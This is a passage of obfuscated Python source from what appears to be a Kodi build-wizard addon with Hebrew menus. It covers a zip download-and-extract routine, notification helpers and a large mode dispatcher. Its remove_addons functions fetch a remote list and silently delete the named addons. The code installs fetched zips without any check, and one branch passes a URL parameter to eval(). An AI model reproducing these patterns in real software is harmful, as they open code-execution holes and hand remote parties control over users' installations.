          OO00O0O0OO0OOOO0O .update (int (OOO0O00OO00O000O0 ),OO00O0OO00OO0OOO0 ,O00O00O000O0O000O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:6441
    O0O00O0O0OO00OO00 =xbmc .translatePath (os .path .join ('special://home/'))#line:6444
    OO0OO000OOOO00O00 .close ()#line:6447
    extract .all (O0O00000OOO0OOOO0 ,O0O00O0O0OO00OO00 ,OO00O0O0OO0OOOO0O )#line:6448
    try :#line:6452
      os .remove (O0O00000OOO0OOOO0 )#line:6453
    except :#line:6454
      pass #line:6455
def telemedia_android5fix ():#line:6456
    if xbmc .getCondVisibility ('system.platform.android'):#line:6458
      xbmc .getInfoLabel ('System.OSVersionInfo')#line:6459
      xbmc .sleep (2000 )#line:6460
      OOOOO0O00OOO0OOO0 =xbmc .getInfoLabel ('System.OSVersionInfo')#line:6461
      if 'Android 5'in OOOOO0O00OOO0OOO0 :#line:6462
        O00O000O0000OOO0O ='https://github.com/kodianonymous1/build/blob/master/tele.zip?raw=true'#line:6463
        O0OOOO00OO000O0O0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6464
        OO0OO0OO0000OO00O =xbmcgui .DialogProgress ()#line:6465
        OO0OO0OO0000OO00O .create ("[B][COLOR=yellow]מתאים את ההרחבה טלמדיה למערכת ההפעלה שלך[/COLOR][/B]","[B][COLOR=green]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6466
        OOO0OO0000OOO0O0O =os .path .join (PACKAGES ,'isr.zip')#line:6467
        OO00O0O0O00OOO000 =urllib2 .Request (O00O000O0000OOO0O )#line:6468
        OO0OO0O000OOO000O =urllib2 .urlopen (OO00O0O0O00OOO000 )#line:6469
        O000000OOO00000O0 =xbmcgui .DialogProgress ()#line:6471
        O000000OOO00000O0 .create ("[B][COLOR=yellow]מתאים את ההרחבה טלמדיה למערכת ההפעלה שלך[/COLOR][/B]","[B][COLOR=green]מוריד....[/COLOR][/B]")#line:6472
        O000000OOO00000O0 .update (0 )#line:6473
        O0O0OO00OOOOO00OO =open (OOO0OO0000OOO0O0O ,'wb')#line:6475
        try :#line:6477
          O0OO00000000O0OOO =OO0OO0O000OOO000O .info ().getheader ('Content-Length').strip ()#line:6478
          OOO000O00O0000OO0 =True #line:6479
        except AttributeError :#line:6480
              OOO000O00O0000OO0 =False #line:6481
        if OOO000O00O0000OO0 :#line:6483
              O0OO00000000O0OOO =int (O0OO00000000O0OOO )#line:6484
        OOO0O0000O0000OOO =0 #line:6486
        O0OO0O0OO0O000O00 =time .time ()#line:6487
        while True :#line:6488
              O000OOO0OOOO0OO0O =OO0OO0O000OOO000O .read (8192 )#line:6489
              if not O000OOO0OOOO0OO0O :#line:6490
                  sys .stdout .write ('\n')#line:6491
                  break #line:6492
              OOO0O0000O0000OOO +=len (O000OOO0OOOO0OO0O )#line:6494
              O0O0OO00OOOOO00OO .write (O000OOO0OOOO0OO0O )#line:6495
              if not OOO000O00O0000OO0 :#line:6497
                  O0OO00000000O0OOO =OOO0O0000O0000OOO #line:6498
              if O000000OOO00000O0 .iscanceled ():#line:6499
                 O000000OOO00000O0 .close ()#line:6500
                 try :#line:6501
                  os .remove (OOO0OO0000OOO0O0O )#line:6502
                 except :#line:6503
                  pass #line:6504
                 break #line:6505
              OO00O0000OOO0OO0O =float (OOO0O0000O0000OOO )/O0OO00000000O0OOO #line:6506
              OO00O0000OOO0OO0O =round (OO00O0000OOO0OO0O *100 ,2 )#line:6507
              OO0000OOO00OO0O00 =OOO0O0000O0000OOO /(1024 *1024 )#line:6508
              O00000OO00OO0OO00 =O0OO00000000O0OOO /(1024 *1024 )#line:6509
              OOO0O0000000OO000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0000OOO00OO0O00 ,'teal',O00000OO00OO0OO00 )#line:6510
              if (time .time ()-O0OO0O0OO0O000O00 )>0 :#line:6511
                OOOO000O00O0OOO0O =OOO0O0000O0000OOO /(time .time ()-O0OO0O0OO0O000O00 )#line:6512
                OOOO000O00O0OOO0O =OOOO000O00O0OOO0O /1024 #line:6513
              else :#line:6514
               OOOO000O00O0OOO0O =0 #line:6515
              O0OOO000O0OOO0000 ='KB'#line:6516
              if OOOO000O00O0OOO0O >=1024 :#line:6517
                 OOOO000O00O0OOO0O =OOOO000O00O0OOO0O /1024 #line:6518
                 O0OOO000O0OOO0000 ='MB'#line:6519
              if OOOO000O00O0OOO0O >0 and not OO00O0000OOO0OO0O ==100 :#line:6520
                  OOOOOO0OO00O00000 =(O0OO00000000O0OOO -OOO0O0000O0000OOO )/OOOO000O00O0OOO0O #line:6521
              else :#line:6522
                  OOOOOO0OO00O00000 =0 #line:6523
              OOO00O0OO0O0OOOO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOO000O00O0OOO0O ,O0OOO000O0OOO0000 )#line:6524
              O000000OOO00000O0 .update (int (OO00O0000OOO0OO0O ),OOO0O0000000OO000 ,OOO00O0OO0O0OOOO0 +"[B][COLOR=green]מוריד.... [/COLOR][/B]")#line:6526
        O0O000OOO0O00000O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6529
        O0O0OO00OOOOO00OO .close ()#line:6532
        extract .all (OOO0OO0000OOO0O0O ,O0O000OOO0O00000O ,O000000OOO00000O0 )#line:6533
        try :#line:6537
          os .remove (OOO0OO0000OOO0O0O )#line:6538
        except :#line:6539
          pass #line:6540
def testnotify ():#line:6543
	O0O0OO0000000000O =wiz .workingURL (NOTIFICATION )#line:6544
	if O0O0OO0000000000O ==True :#line:6545
		try :#line:6546
			O0OO000OO00O0OOOO ,OO000OOO0000O0O0O =wiz .splitNotify (NOTIFICATION )#line:6547
			if O0OO000OO00O0OOOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6548
			if STARTP2 ()=='ok':#line:6549
				notify .notification (OO000OOO0000O0O0O ,True )#line:6550
		except Exception as O0000OO0000OOOO0O :#line:6551
			wiz .log ("Error on Notifications Window: %s"%str (O0000OO0000OOOO0O ),xbmc .LOGERROR )#line:6552
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6553
def testnotify2 ():#line:6554
	O0O0O0OOOO00OO0O0 =wiz .workingURL (NOTIFICATION2 )#line:6555
	if O0O0O0OOOO00OO0O0 ==True :#line:6556
		try :#line:6557
			O00O0OOO00O0000O0 ,OOO0OOOOOO00OO000 =wiz .splitNotify (NOTIFICATION2 )#line:6558
			if O00O0OOO00O0000O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6559
			if STARTP2 ()=='ok':#line:6560
				notify .notification2 (OOO0OOOOOO00OO000 ,True )#line:6561
		except Exception as OO00O0OOOOO0OO0O0 :#line:6562
			wiz .log ("Error on Notifications Window: %s"%str (OO00O0OOOOO0OO0O0 ),xbmc .LOGERROR )#line:6563
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6564
def testnotify3 ():#line:6565
	O0OOOO00OO0OO000O =wiz .workingURL (NOTIFICATION3 )#line:6566
	if O0OOOO00OO0OO000O ==True :#line:6567
		try :#line:6568
			O0O0000000OOOO0O0 ,OOOOOOO00000OO0OO =wiz .splitNotify (NOTIFICATION3 )#line:6569
			if O0O0000000OOOO0O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6570
			if STARTP2 ()=='ok':#line:6571
				notify .notification3 (OOOOOOO00000OO0OO ,True )#line:6572
		except Exception as OO00O00O0OOO0OOOO :#line:6573
			wiz .log ("Error on Notifications Window: %s"%str (OO00O00O0OOO0OOOO ),xbmc .LOGERROR )#line:6574
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6575
def wait ():#line:6576
 wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אנא המתן[/COLOR]"%COLOR2 )#line:6577
def infobuild ():#line:6578
	OOOO0000OO0OOOO00 =wiz .workingURL (NOTIFICATION )#line:6579
	if OOOO0000OO0OOOO00 ==True :#line:6580
		try :#line:6581
			OO0O00OOOO000O000 ,OO0OO0O0O000OOOOO =wiz .splitNotify (NOTIFICATION )#line:6582
			if OO0O00OOOO000O000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6583
			if STARTP2 ()=='ok':#line:6584
				notify .updateinfo (OO0OO0O0O000OOOOO ,True )#line:6585
		except Exception as O0OOOO0OOOO00O0O0 :#line:6586
			wiz .log ("Error on Notifications Window: %s"%str (O0OOOO0OOOO00O0O0 ),xbmc .LOGERROR )#line:6587
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6588
def servicemanual ():#line:6589
	O00OOOO000O00000O =wiz .workingURL (HELPINFO )#line:6590
	if O00OOOO000O00000O ==True :#line:6591
		try :#line:6592
			O000OOOO00OOO0OO0 ,O0OO0000O00OO0OOO =wiz .splitNotify (HELPINFO )#line:6593
			if O000OOOO00OOO0OO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:6594
			notify .helpinfo (O0OO0000O00OO0OOO ,True )#line:6595
		except Exception as OOO0OO000OOO0OO0O :#line:6596
			wiz .log ("Error on Notifications Window: %s"%str (OOO0OO000OOO0OO0O ),xbmc .LOGERROR )#line:6597
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:6598
def testupdate ():#line:6600
	if BUILDNAME =="":#line:6601
		notify .updateWindow ()#line:6602
	else :#line:6603
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:6604
def testfirst ():#line:6606
	notify .firstRun ()#line:6607
def testfirstRun ():#line:6609
	notify .firstRunSettings ()#line:6610
def fastinstall ():#line:6613
	notify .firstRuninstall ()#line:6614
def addDir (OOOO00OOOO00O0O0O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6621
	OO0OOO0000OO00O00 =sys .argv [0 ]#line:6622
	if not mode ==None :OO0OOO0000OO00O00 +="?mode=%s"%urllib .quote_plus (mode )#line:6623
	if not name ==None :OO0OOO0000OO00O00 +="&name="+urllib .quote_plus (name )#line:6624
	if not url ==None :OO0OOO0000OO00O00 +="&url="+urllib .quote_plus (url )#line:6625
	OOO00OO00000OO0OO =True #line:6626
	if themeit :OOOO00OOOO00O0O0O =themeit %OOOO00OOOO00O0O0O #line:6627
	OOO00OOO0OOO000O0 =xbmcgui .ListItem (OOOO00OOOO00O0O0O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6628
	OOO00OOO0OOO000O0 .setInfo (type ="Video",infoLabels ={"Title":OOOO00OOOO00O0O0O ,"Plot":description })#line:6629
	OOO00OOO0OOO000O0 .setProperty ("Fanart_Image",fanart )#line:6630
	if not menu ==None :OOO00OOO0OOO000O0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:6631
	OOO00OO00000OO0OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO0OOO0000OO00O00 ,listitem =OOO00OOO0OOO000O0 ,isFolder =True )#line:6632
	return OOO00OO00000OO0OO #line:6633
def addFile (O00OO0O00OOO00OOO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6635
	OOOOO00O0OOO0OOO0 =sys .argv [0 ]#line:6636
	if not mode ==None :OOOOO00O0OOO0OOO0 +="?mode=%s"%urllib .quote_plus (mode )#line:6637
	if not name ==None :OOOOO00O0OOO0OOO0 +="&name="+urllib .quote_plus (name )#line:6638
	if not url ==None :OOOOO00O0OOO0OOO0 +="&url="+urllib .quote_plus (url )#line:6639
	O000OO0OO00O00O00 =True #line:6640
	if themeit :O00OO0O00OOO00OOO =themeit %O00OO0O00OOO00OOO #line:6641
	OO0O0O000O0O0OO0O =xbmcgui .ListItem (O00OO0O00OOO00OOO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6642
	OO0O0O000O0O0OO0O .setInfo (type ="Video",infoLabels ={"Title":O00OO0O00OOO00OOO ,"Plot":description })#line:6643
	OO0O0O000O0O0OO0O .setProperty ("Fanart_Image",fanart )#line:6644
	if not menu ==None :OO0O0O000O0O0OO0O .addContextMenuItems (menu ,replaceItems =overwrite )#line:6645
	O000OO0OO00O00O00 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOOOO00O0OOO0OOO0 ,listitem =OO0O0O000O0O0OO0O ,isFolder =False )#line:6646
	return O000OO0OO00O00O00 #line:6647
def get_params ():#line:6649
	OOO00OO0OOO00OOOO =[]#line:6650
	O0O00000OO0OO000O =sys .argv [2 ]#line:6651
	if len (O0O00000OO0OO000O )>=2 :#line:6652
		OOOOOOOO0000O0O0O =sys .argv [2 ]#line:6653
		OOO000OOOO0OO000O =OOOOOOOO0000O0O0O .replace ('?','')#line:6654
		if (OOOOOOOO0000O0O0O [len (OOOOOOOO0000O0O0O )-1 ]=='/'):#line:6655
			OOOOOOOO0000O0O0O =OOOOOOOO0000O0O0O [0 :len (OOOOOOOO0000O0O0O )-2 ]#line:6656
		OO0OO0OOO0000O0O0 =OOO000OOOO0OO000O .split ('&')#line:6657
		OOO00OO0OOO00OOOO ={}#line:6658
		for O0O0000O0O00OOO00 in range (len (OO0OO0OOO0000O0O0 )):#line:6659
			OO0000OOO0OO0OOO0 ={}#line:6660
			OO0000OOO0OO0OOO0 =OO0OO0OOO0000O0O0 [O0O0000O0O00OOO00 ].split ('=')#line:6661
			if (len (OO0000OOO0OO0OOO0 ))==2 :#line:6662
				OOO00OO0OOO00OOOO [OO0000OOO0OO0OOO0 [0 ]]=OO0000OOO0OO0OOO0 [1 ]#line:6663
		return OOO00OO0OOO00OOOO #line:6665
def remove_addons ():#line:6667
	try :#line:6668
			import json #line:6669
			O0000O000000OO00O =urllib2 .urlopen (remove_url ).readlines ()#line:6670
			for O0000000OO0000OOO in O0000O000000OO00O :#line:6671
				O000000O000OO0O00 =O0000000OO0000OOO .split (':')[1 ].strip ()#line:6673
				OOO0OO0O0OOO00O00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O000000O000OO0O00 ,'false')#line:6674
				OO0000OO0OOOOOOO0 =xbmc .executeJSONRPC (OOO0OO0O0OOO00O00 )#line:6675
				OOOOOOOOO00O00000 =json .loads (OO0000OO0OOOOOOO0 )#line:6676
				OO0O00OOOO0OO0O00 =os .path .join (addons_folder ,O000000O000OO0O00 )#line:6678
				if os .path .exists (OO0O00OOOO0OO0O00 ):#line:6680
					for OO000O00OOOOO0O0O ,OOO000O0O0000O000 ,OO0O0O0OOOOO00OOO in os .walk (OO0O00OOOO0OO0O00 ):#line:6681
						for O0O0O0OO00O00O0OO in OO0O0O0OOOOO00OOO :#line:6682
							os .unlink (os .path .join (OO000O00OOOOO0O0O ,O0O0O0OO00O00O0OO ))#line:6683
						for OOOO00OOOOOO0O000 in OOO000O0O0000O000 :#line:6684
							shutil .rmtree (os .path .join (OO000O00OOOOO0O0O ,OOOO00OOOOOO0O000 ))#line:6685
					os .rmdir (OO0O00OOOO0OO0O00 )#line:6686
			xbmc .executebuiltin ('Container.Refresh')#line:6688
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:6689
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:6690
	except :pass #line:6691
def remove_addons2 ():#line:6692
	try :#line:6693
			import json #line:6694
			O0O0O000O0OOOO00O =urllib2 .urlopen (remove_url2 ).readlines ()#line:6695
			for O000OO0O00OOOO0O0 in O0O0O000O0OOOO00O :#line:6696
				O0OO0OOO0OOO00O0O =O000OO0O00OOOO0O0 .split (':')[1 ].strip ()#line:6698
				OO0O000O000000O00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O0OO0OOO0OOO00O0O ,'false')#line:6699
				O0000O0O0OO0OOOO0 =xbmc .executeJSONRPC (OO0O000O000000O00 )#line:6700
				OOOOOOO0OO00OO00O =json .loads (O0000O0O0OO0OOOO0 )#line:6701
				O0O00O00O0O00OOOO =os .path .join (user_folder ,O0OO0OOO0OOO00O0O )#line:6703
				if os .path .exists (O0O00O00O0O00OOOO ):#line:6705
					for O000OOO0O000O0O0O ,O00000OO00OOOO000 ,O00000OOO0OOOOO00 in os .walk (O0O00O00O0O00OOOO ):#line:6706
						for O0O0OO0OOOOOOO0O0 in O00000OOO0OOOOO00 :#line:6707
							os .unlink (os .path .join (O000OOO0O000O0O0O ,O0O0OO0OOOOOOO0O0 ))#line:6708
						for O0OOOO00O0O00000O in O00000OO00OOOO000 :#line:6709
							shutil .rmtree (os .path .join (O000OOO0O000O0O0O ,O0OOOO00O0O00000O ))#line:6710
					os .rmdir (O0O00O00O0O00OOOO )#line:6711
	except :pass #line:6713
params =get_params ()#line:6714
url =None #line:6715
name =None #line:6716
mode =None #line:6717
try :mode =urllib .unquote_plus (params ["mode"])#line:6719
except :pass #line:6720
try :name =urllib .unquote_plus (params ["name"])#line:6721
except :pass #line:6722
try :url =urllib .unquote_plus (params ["url"])#line:6723
except :pass #line:6724
def setView (O00OO0OOO0O0000O0 ,O0O0O0OOO0O00OO0O ):#line:6728
	if wiz .getS ('auto-view')=='true':#line:6729
		OO0000O00OO0O00OO =wiz .getS (O0O0O0OOO0O00OO0O )#line:6730
		if OO0000O00OO0O00OO =='50'and KODIV >=17 and SKIN =='skin.estuary':OO0000O00OO0O00OO ='55'#line:6731
		if OO0000O00OO0O00OO =='500'and KODIV >=17 and SKIN =='skin.estuary':OO0000O00OO0O00OO ='50'#line:6732
		wiz .ebi ("Container.SetViewMode(%s)"%OO0000O00OO0O00OO )#line:6733
if mode ==None :index ()#line:6735
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:6737
elif mode =='builds':buildMenu ()#line:6738
elif mode =='viewbuild':viewBuild (name )#line:6739
elif mode =='buildinfo':buildInfo (name )#line:6740
elif mode =='buildpreview':buildVideo (name )#line:6741
elif mode =='install':buildWizard (name ,url )#line:6742
elif mode =='theme':buildWizard (name ,mode ,url )#line:6743
elif mode =='viewthirdparty':viewThirdList (name )#line:6744
elif mode =='installthird':thirdPartyInstall (name ,url )#line:6745
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:6746
elif mode =='maint':maintMenu (name )#line:6748
elif mode =='passpin':passandpin ()#line:6749
elif mode =='backmyupbuild':backmyupbuild ()#line:6750
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:6751
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:6752
elif mode =='advancedsetting':advancedWindow (name )#line:6753
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:6754
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:6755
elif mode =='asciicheck':wiz .asciiCheck ()#line:6756
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:6757
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:6758
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:6759
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:6760
elif mode =='oldThumbs':wiz .oldThumbs ()#line:6761
elif mode =='clearbackup':wiz .cleanupBackup ()#line:6762
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:6763
elif mode =='currentsettings':viewAdvanced ()#line:6764
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:6765
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:6766
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:6767
elif mode =='fixskin':backtokodi ()#line:6768
elif mode =='testcommand':testcommand ()#line:6769
elif mode =='logsend':logsend ()#line:6770
elif mode =='rdon':rdon ()#line:6771
elif mode =='rdoff':rdoff ()#line:6772
elif mode =='setrd':setrealdebrid ()#line:6773
elif mode =='setrd2':setautorealdebrid ()#line:6774
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:6775
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:6776
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:6777
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:6778
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:6779
elif mode =='freshstart':freshStart ()#line:6780
elif mode =='forceupdate':wiz .forceUpdate ()#line:6781
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:6782
elif mode =='forceclose':wiz .killxbmc ()#line:6783
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:6784
elif mode =='hidepassword':wiz .hidePassword ()#line:6785
elif mode =='unhidepassword':wiz .unhidePassword ()#line:6786
elif mode =='enableaddons':enableAddons ()#line:6787
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:6788
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:6789
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:6790
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:6791
elif mode =='uploadlog':uploadLog .Main ()#line:6792
elif mode =='viewlog':LogViewer ()#line:6793
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:6794
elif mode =='viewerrorlog':errorChecking (all =True )#line:6795
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:6796
elif mode =='purgedb':purgeDb ()#line:6797
elif mode =='fixaddonupdate':fixUpdate ()#line:6798
elif mode =='removeaddons':removeAddonMenu ()#line:6799
elif mode =='removeaddon':removeAddon (name )#line:6800
elif mode =='removeaddondata':removeAddonDataMenu ()#line:6801
elif mode =='removedata':removeAddonData (name )#line:6802
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:6803
elif mode =='systeminfo':systemInfo ()#line:6804
elif mode =='restorezip':restoreit ('build')#line:6805
elif mode =='restoregui':restoreit ('gui')#line:6806
elif mode =='restoreaddon':restoreit ('addondata')#line:6807
elif mode =='restoreextzip':restoreextit ('build')#line:6808
elif mode =='restoreextgui':restoreextit ('gui')#line:6809
elif mode =='restoreextaddon':restoreextit ('addondata')#line:6810
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:6811
elif mode =='traktsync':traktsync ()#line:6812
elif mode =='apk':apkMenu (name )#line:6814
elif mode =='apkscrape':apkScraper (name )#line:6815
elif mode =='apkinstall':apkInstaller (name ,url )#line:6816
elif mode =='speed':speedMenu ()#line:6817
elif mode =='net':net_tools ()#line:6818
elif mode =='GetList':GetList (url )#line:6819
elif mode =='youtube':youtubeMenu (name )#line:6820
elif mode =='viewVideo':playVideo (url )#line:6821
elif mode =='addons':addonMenu (name )#line:6823
elif mode =='addoninstall':addonInstaller (name ,url )#line:6824
elif mode =='savedata':saveMenu ()#line:6826
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:6827
elif mode =='managedata':manageSaveData (name )#line:6828
elif mode =='whitelist':wiz .whiteList (name )#line:6829
elif mode =='trakt':traktMenu ()#line:6831
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:6832
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:6833
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:6834
elif mode =='cleartrakt':traktit .clearSaved (name )#line:6835
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:6836
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:6837
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:6838
elif mode =='realdebrid':realMenu ()#line:6840
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:6841
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:6842
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:6843
elif mode =='cleardebrid':debridit .clearSaved (name )#line:6844
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:6845
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:6846
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:6847
elif mode =='login':loginMenu ()#line:6849
elif mode =='savelogin':loginit .loginIt ('update',name )#line:6850
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:6851
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:6852
elif mode =='clearlogin':loginit .clearSaved (name )#line:6853
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:6854
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:6855
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:6856
elif mode =='contact':notify .contact (CONTACT )#line:6858
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:6859
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:6860
elif mode =='developer':developer ()#line:6862
elif mode =='converttext':wiz .convertText ()#line:6863
elif mode =='createqr':wiz .createQR ()#line:6864
elif mode =='testnotify':testnotify ()#line:6865
elif mode =='testnotify2':testnotify2 ()#line:6866
elif mode =='servicemanual':servicemanual ()#line:6867
elif mode =='fastinstall':fastinstall ()#line:6868
elif mode =='testupdate':testupdate ()#line:6869
elif mode =='testfirst':testfirst ()#line:6870
elif mode =='testfirstrun':testfirstRun ()#line:6871
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:6872
elif mode =='bg':wiz .bg_install (name ,url )#line:6874
elif mode =='bgcustom':wiz .bg_custom ()#line:6875
elif mode =='bgremove':wiz .bg_remove ()#line:6876
elif mode =='bgdefault':wiz .bg_default ()#line:6877
elif mode =='rdset':rdsetup ()#line:6878
elif mode =='mor':morsetup ()#line:6879
elif mode =='mor2':morsetup2 ()#line:6880
elif mode =='resolveurl':resolveurlsetup ()#line:6881
elif mode =='urlresolver':urlresolversetup ()#line:6882
elif mode =='forcefastupdate':forcefastupdate ()#line:6883
elif mode =='traktset':traktsetup ()#line:6884
elif mode =='placentaset':placentasetup ()#line:6885
elif mode =='flixnetset':flixnetsetup ()#line:6886
elif mode =='reptiliaset':reptiliasetup ()#line:6887
elif mode =='yodasset':yodasetup ()#line:6888
elif mode =='numbersset':numberssetup ()#line:6889
elif mode =='uranusset':uranussetup ()#line:6890
elif mode =='genesisset':genesissetup ()#line:6891
elif mode =='fastupdate':fastupdate ()#line:6892
elif mode =='folderback':folderback ()#line:6893
elif mode =='menudata':Menu ()#line:6894
elif mode =='infoupdate':infobuild ()#line:6895
elif mode =='wait':wait ()#line:6896
elif mode ==2 :#line:6897
        wiz .torent_menu ()#line:6898
elif mode ==3 :#line:6899
        wiz .popcorn_menu ()#line:6900
elif mode ==8 :#line:6901
        wiz .metaliq_fix ()#line:6902
elif mode ==9 :#line:6903
        wiz .quasar_menu ()#line:6904
elif mode ==5 :#line:6905
        swapSkins ('skin.Premium.mod')#line:6906
elif mode ==13 :#line:6907
        wiz .elementum_menu ()#line:6908
elif mode ==16 :#line:6909
        wiz .fix_wizard ()#line:6910
elif mode ==17 :#line:6911
        wiz .last_play ()#line:6912
elif mode ==18 :#line:6913
        wiz .normal_metalliq ()#line:6914
elif mode ==19 :#line:6915
        wiz .fast_metalliq ()#line:6916
elif mode ==20 :#line:6917
        wiz .fix_buffer2 ()#line:6918
elif mode ==21 :#line:6919
        wiz .fix_buffer3 ()#line:6920
elif mode ==11 :#line:6921
        wiz .fix_buffer ()#line:6922
elif mode ==15 :#line:6923
        wiz .fix_font ()#line:6924
elif mode ==14 :#line:6925
        wiz .clean_pass ()#line:6926
elif mode ==22 :#line:6927
        wiz .movie_update ()#line:6928
elif mode =='simpleiptv':#line:6931
    DIALOG =xbmcgui .Dialog ()#line:6933
    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את חשבון ה IPTV?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:6934
    if choice ==1 :#line:6935
